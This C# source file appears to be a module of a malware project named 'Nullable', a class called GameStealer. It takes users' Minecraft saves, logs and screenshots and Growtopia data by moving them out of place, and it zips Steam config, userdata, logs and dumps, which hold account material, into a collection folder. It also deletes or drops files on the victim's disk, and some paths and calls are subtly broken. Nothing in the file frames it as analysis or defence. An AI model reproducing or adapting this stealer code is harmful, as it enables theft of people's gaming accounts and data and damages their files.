using Nullable.Modules.Manager;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.IO.Compression;

namespace Nullable.Modules.Stealer
{
    internal sealed class GameStealer
    {
        public static void Run()
        {
            Minecraft_Logger();
            Thread.Sleep(50);
            Growtopia_Save_Stealer();
            Thread.Sleep(50);
            Steam_Stealer();
        }
        public static void Minecraft_Logger()
        {
            string Minecraft = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\.minecraft";

            if (Directory.Exists(Minecraft))
            {
                Directory.CreateDirectory(Config.LogPath + "\\Games");
                Directory.CreateDirectory(Config.LogPath + "\\Games\\Minecraft");
                Thread.Sleep(100);
                try
                {
                    if (Directory.Exists(Minecraft + "\\saves"))
                    {
                        Directory.Move(Minecraft + "\\saves", Config.LogPath + "\\Games\\Minecraft\\Saves");
                        Thread.Sleep(50);
                        Directory.CreateDirectory(Minecraft + "\\saves");
                    }
                    Thread.Sleep(25);
                    if (Directory.Exists(Minecraft + "\\logs"))
                    {
                        Directory.Move(Minecraft + "\\logs", Config.LogPath + "\\Games\\Logs");
                        Thread.Sleep(50);
                        Directory.CreateDirectory(Minecraft + "\\logs");
                    }
                    Thread.Sleep(25);
                    if (Directory.Exists(Minecraft + "\\screenshots"))
                    {
                        Directory.Move(Minecraft + "\\screenshots", Config.LogPath + "\\Games\\Minecraft\\Screenshots");
                        Thread.Sleep(50);
                        Directory.CreateDirectory(Minecraft + "\\screenshots");
                    }
                    Thread.Sleep(25);
                    if (Directory.Exists(Minecraft + "\\addons"))
                    {
                        Directory.Move(Minecraft + "\\addons", Config.LogPath + "\\Games\\Minecraft\\Addons");
                        Thread.Sleep(20);
                        Directory.CreateDirectory(Minecraft + "\\addons");
                    }


                }
                catch (Exception ex)
                {
                    Logger.Log(ex.ToString());
                }
            }
            else
            {
                Console.Beep();
                File.Create("C:\\tPxC4xGen.exe");
            }
        }

        public static void Growtopia_Save_Stealer()
        {
            string User = Environment.UserName;
            string Growtopia_Path = "C:\\Users\\" + User + "\\AppData\\Local\\Growtopia";
            if (Directory.Exists(Growtopia_Path))
            {
                try
                {
                    Directory.CreateDirectory(Config.LogPath + "\\Games\\Growtopia");
                    Thread.Sleep(1000);
                    Directory.Move(Growtopia_Path, Config.LogPath + "\\Games\\Minecraft\\Saves");
                    Thread.Sleep(5000);
                    File.Delete(Growtopia_Path);

                }
                catch (Exception ex)
                {
                    Directory.Delete(Growtopia_Path);
                    Logger.Log(ex.ToString());


                }
            }
            else
            {


            }
        }

        public static void Steam_Stealer()
        {
            try
            {
                string Logs_path = "C:\\Program Files (x86)\\Steam\\logs";
                string Dump_path = "C:\\Program Files (x86)\\Steam\\dumps";
                string UserData_path = "C:\\Program Files (x86)\\Steam\\userdata";
                string Config_Path = "C:\\Program Files (x86)\\Steam\\config";

                string Csgo_Client_Path = "C:\\Program Files (x86)\\Steam\\steamapps\\common\\Counter-Strike Global Offensive\\platform\\steam\\games";
                string Csgo_Id_Path = "C:\\Program Files (x86)\\Steamsteamapps\\common\\Counter-Strike Global Offensive\\steam_appid.txt";

                Directory.CreateDirectory(Config.LogPath + "\\Games\\Steam");
                Directory.CreateDirectory(Config.LogPath + "\\Games\\Steam\\Csgo");

                if (File.Exists(Csgo_Client_Path))
                {
                    ZipFile.CreateFromDirectory(Csgo_Client_Path, Config.LogPath + "\\Games\\Steam\\Csgo\\Gamedata.zip");
                }

                else if (File.Exists(Csgo_Id_Path))
                {
                    string Csgo_Id = File.ReadAllText("C:\\Program Files (x86)\\Steamsteamapps\\common\\Counter-Strike Global Offensive");
                    File.WriteAllText(Config.LogPath + "\\Games\\Steam\\Csgo\\Csgo_Id.txt", Csgo_Id);
                }
                else if (Directory.Exists(Config_Path))
                {
                    ZipFile.CreateFromDirectory(Config_Path, Config.LogPath + "\\Games\\Steam\\Config.zip");
                }

                else if (Directory.Exists(Logs_path))
                {
                    ZipFile.CreateFromDirectory(Logs_path, Config.LogPath + "\\Games\\Steam\\Logs.zip");
                }

                else if (Directory.Exists(Dump_path))
                {
                    ZipFile.CreateFromDirectory(Dump_path, Config.LogPath + "\\Games\\Steam\\Dumps.zip");
                }

                else if (Directory.Exists(UserData_path))
                {
                    ZipFile.CreateFromDirectory(UserData_path, Config.LogPath + "\\Games\\Steam\\Userdata.zip");
                }

                Thread.Sleep(5);
            }
            catch (Exception ex)
            {
                Logger.Log(ex.ToString());
            }
        }
    }
}
